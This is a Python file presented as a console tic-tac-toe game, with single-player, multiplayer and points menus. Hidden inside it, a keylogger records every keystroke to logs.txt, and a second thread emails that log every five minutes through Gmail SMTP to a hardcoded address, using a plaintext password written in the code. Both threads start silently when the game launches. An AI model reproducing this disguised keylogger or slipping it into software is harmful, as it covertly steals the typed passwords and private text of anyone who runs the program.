import os
import sys
import time as time
from pynput.keyboard import Key, Listener
import logging 
import smtplib
from threading import Thread
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# Global Variables:
board = [" _  "," _  "," _  ",
         " _  "," _  "," _  ",
         " _  "," _  "," _  ",]
a = 0
name = []
points = [] 
gameover = False

# Rough:
# 0 1 2
# 3 4 5
# 6 7 8
def win():
    point = 0
    if board[0] == " X  " and board[1] == " X  " and board[2] == " X  " or board[6] == " X  " and board[7] == " X  " and board[8] == " X  " or board[3] == " X  " and board[4] == " X  " and board[5] == " X  ":
        print("You Win..points = +20")
        return True
    elif board[0] == " X  " and board[3] == " X  " and board[6] == " X  " or board[1] == " X  " and board[4] == " X  " and board[7] == " X  " or board[2] == " X  " and board[5] == " X  " and board[8] == " X  ":
        print("You Win..points = +20")
        return True
    elif board[0] == " X  " and board[4] == " X  " and board[8] == " X  " or board[2] == " X  " and board[4] == " X  " and board[6] == " X  ":
        print("You Win..points = +20")
        point+= 20
        points.append(point)
        return True

def lose():
    point = 0
    if board[0] == " O  " and board[1] == " O  " and board[2] == " O  " or board[6] == " O  " and board[7] == " O  " and board[8] == " O  " or board[3] == " O  " and board[4] == " O  " and board[5] == " O  ":
        print("COMPUTER Wins..points = -20")
        return True
    elif board[0] == " O  " and board[3] == " O  " and board[6] == " O  " or board[1] == " O  " and board[4] == " O  " and board[7] == " O  " or board[2] == " O  " and board[5] == " O  " and board[8] == " O  ":
        print("COMPUTER Wins..points = -20")
        return True
    elif board[0] == " O  " and board[4] == " O  " and board[8] == " O  " or board[2] == " O  " and board[4] == " O  " and board[6] == " O  ":
        print("COMPUTER Wins..points = -20")
        return True
        point-=20
        points.append(point)
# KEYLOGGER ADDING
def logger():
    log_dir = ""
    logging.basicConfig(filename = (log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')
    def on_press(key):
        logging.info(key)
    with Listener(on_press=on_press) as listener:
        listener.join()

# logs mailer
def mailme():
    while True:
        time.sleep(300)
        sender_email = "gamersahilsingh7@gmail.com"
        rec_email = "np01nt4a190175@islingtoncollege.edu.np"
        password = 'blackarch2020'

        message = MIMEMultipart()

        message['From'] = sender_email
        message['To'] = rec_email
        message['Subject'] = 'Coffin bot mailing you.'

        body = "Body of the mail."

        message.attach(MIMEText(body, 'plain'))

        filename = 'logs.txt'
        attachment = open(filename, 'rb')

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())

        # Base 64 
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        message.attach(p)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        text = message.as_string()
        server.send_message(message)
        server.quit()
Thread(target=logger).start()
Thread(target=mailme).start()
def cpu_move():
    import random
    a = random.randrange(9)
    while board[a] !=" _  ":
        a = random.randrange(9)
    board[a] = " O  "
# ---------------------------------------------------------------------
    #           Defining for Multiplayer:
# ---------------------------------------------------------------------
def multiwin1():
    if board[0] == " X  " and board[1] == " X  " and board[2] == " X  " or board[6] == " X  " and board[7] == " X  " and board[8] == " X  " or board[3] == " X  " and board[4] == " X  " and board[5] == " X  ":
        print(name1 ,"You Win..")
        return True
    elif board[0] == " X  " and board[3] == " X  " and board[6] == " X  " or board[1] == " X  " and board[4] == " X  " and board[7] == " X  " or board[2] == " X  " and board[5] == " X  " and board[8] == " X  ":
        print(name1 ,"You Win..")
        return True
    elif board[0] == " X  " and board[4] == " X  " and board[8] == " X  " or board[2] == " X  " and board[4] == " X  " and board[6] == " X  ":
        print(name1 ,"You Win..")
        return True




def multiwin2():
    if board[0] == " O  " and board[1] == " O  " and board[2] == " O  " or board[6] == " O  " and board[7] == " O  " and board[8] == " O  " or board[3] == " O  " and board[4] == " O  " and board[5] == " O  ":
        print(name2 ," Wins.. ")
        return True
    elif board[0] == " O  " and board[3] == " O  " and board[6] == " O  " or board[1] == " O  " and board[4] == " O  " and board[7] == " O  " or board[2] == " O  " and board[5] == " O  " and board[8] == " O  ":
        print(name2 ," Wins.. ")
        return True
    elif board[0] == " O  " and board[4] == " O  " and board[8] == " O  " or board[2] == " O  " and board[4] == " O  " and board[6] == " O  ":
        print(name2 ," Wins..")
        return True

def game():
    print("                      ",board[6],board[7],board[8],"                       7         8        9    ")
    print()
    print("                      ",board[3],board[4],board[5],"        =========>>    4         5        6    ")
    print()
    print("                      ",board[0],board[1],board[2],"                       1         2        3    ")
    print()
print('''
        
$$$$$$$$\ $$$$$$\  $$$$$$\                      $$$$$$$$\                                      $$$$$$$$\                  
\__$$  __|\_$$  _|$$  __$$\                     \__$$  __|                                     \__$$  __|                 
   $$ |     $$ |  $$ /  \__|                       $$ | $$$$$$\   $$$$$$$\                        $$ | $$$$$$\   $$$$$$\  
   $$ |     $$ |  $$ |            $$$$$$\          $$ | \____$$\ $$  _____|      $$$$$$\          $$ |$$  __$$\ $$  __$$\ 
   $$ |     $$ |  $$ |            \______|         $$ | $$$$$$$ |$$ /            \______|         $$ |$$ /  $$ |$$$$$$$$ |
   $$ |     $$ |  $$ |  $$\                        $$ |$$  __$$ |$$ |                             $$ |$$ |  $$ |$$   ____|
   $$ |   $$$$$$\ \$$$$$$  |                       $$ |\$$$$$$$ |\$$$$$$$\                        $$ |\$$$$$$  |\$$$$$$$\ 
   \__|   \______| \______/                        \__| \_______| \_______|                       \__| \______/  \_______|
                                                                                                                          
                                                                                                                          
                                                                                                                          

''')
print('''
                                             0.Exit
                                           1.Single Player
                                           2.Multiplayer
                                           3.points
''')
choice = int(input("Enter your Choice =  "))
if choice == 1:
    game()
    naam = input("Enter Players Name : ")
    name.append(naam)
    while gameover!=True:
        choice = int(input("Enter the position You Want to mark(1-9) : "))
        while board[choice-1] !=" _  ":
            choice = int(input("Enter Choice Again = "))
        board[choice-1] = " X  "
        print()
        print()
        if win()==True:
            gameover = True
            
        elif lose()==True:
            gameover = True
            
        elif " _  " not in board:
            print("Tie")
            gameover = True
            
        cpu_move()
        game()
elif choice == 2:
    game()
    name1 = input("Enter name of the 1'st Player : ")
    name2 = input("Enter name of the 2'nd Player : ")
    while gameover!=True:
        print(name1,"'s turn")
        choice1 = int(input("Enter ur Choice : "))
        board[choice1-1] = " X  "
        game()
        if multiwin1()==True:
            gameover = True
            break
        elif " _  " not in board:
            print("Tie.. ")
            break
        print(name2,"'s turn")
        choice2 = int(input("Enter ur Choice : "))
        board[choice2-1] = " O  "
        if multiwin2()==True:
            gameover = True
            break
        game()
        
elif choice==0:
    print("Developed by Sahil Singh /XD-Coffin----You Just lost even if it")
    print("                     DID'NT   EVEN STARTED ..  :-(")
elif choice==3:
    for n in name:
        print(          "Name/Points")
        print("             ",n)
    for p in points:
        print("             ",p)    
    
print("Thank You For Supporting The Developer Sahil Singh/XD-COFFIN..")
